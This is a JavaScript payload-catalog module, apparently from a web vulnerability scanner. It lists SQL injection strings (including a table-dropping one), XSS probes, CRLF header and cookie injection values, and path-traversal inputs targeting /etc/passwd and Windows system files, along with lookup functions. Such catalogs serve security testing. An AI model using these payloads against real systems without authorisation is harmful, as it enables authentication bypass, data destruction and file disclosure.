/**
 * Payload Engine
 * Centralized, modular catalog of attack payloads.
 * Add new payload sets here without touching any other engine.
 */

const PAYLOADS = {
  'SQL Injection': [
    { value: "' OR '1'='1", description: 'Basic single-quote bypass' },
    { value: "' OR 1=1 --", description: 'Comment-based SQLi' },
    { value: '" OR "1"="1', description: 'Double-quote bypass' },
    { value: "' UNION SELECT NULL,NULL --", description: 'UNION-based injection' },
    { value: "1' AND SLEEP(5) --", description: 'Time-based blind SQLi' },
    { value: "'; DROP TABLE users --", description: 'Destructive SQLi (detection only)' },
    { value: "1 OR 1=1", description: 'Numeric parameter bypass' },
    { value: "admin'--", description: 'Auth bypass pattern' },
    { value: "' OR 'x'='x", description: 'Tautology bypass' },
    { value: "1; SELECT * FROM information_schema.tables --", description: 'Schema enumeration' },
  ],

  XSS: [
    { value: '<script>alert(1)</script>', description: 'Basic script tag XSS' },
    { value: '"><script>alert(document.cookie)</script>', description: 'Attribute-break XSS' },
    { value: "<img src=x onerror=alert(1)>", description: 'Image onerror XSS' },
    { value: "javascript:alert(1)", description: 'JavaScript protocol XSS' },
    { value: "<svg onload=alert(1)>", description: 'SVG-based XSS' },
    { value: "'><script>alert(1)</script>", description: 'Single-quote break XSS' },
    { value: "<body onload=alert(1)>", description: 'Body onload XSS' },
    { value: "<!--<script>alert(1)</script>-->", description: 'HTML comment bypass' },
  ],

  'Header Injection': [
    { value: "test\r\nInjected-Header: true", description: 'CRLF injection' },
    { value: "test\r\nSet-Cookie: malicious=value", description: 'Cookie injection via CRLF' },
    { value: "%0d%0aInjected: header", description: 'URL-encoded CRLF' },
  ],

  'Path Traversal': [
    { value: '../../../../etc/passwd', description: 'Unix path traversal' },
    { value: '..%2F..%2F..%2Fetc%2Fpasswd', description: 'URL-encoded traversal' },
    { value: '....//....//etc/passwd', description: 'Double-dot bypass' },
    { value: '..\\..\\..\\windows\\system32\\drivers\\etc\\hosts', description: 'Windows path traversal' },
  ],
};

/**
 * Get all payloads for a specific vulnerability type
 */
function getPayloads(type) {
  return PAYLOADS[type] || [];
}

/**
 * Get all vulnerability types
 */
function getAllTypes() {
  return Object.keys(PAYLOADS);
}

/**
 * Get all payloads as a flat list with type attached
 */
function getAllPayloads() {
  const all = [];
  for (const [type, payloads] of Object.entries(PAYLOADS)) {
    for (const payload of payloads) {
      all.push({ type, ...payload });
    }
  }
  return all;
}

module.exports = { getPayloads, getAllTypes, getAllPayloads, PAYLOADS };
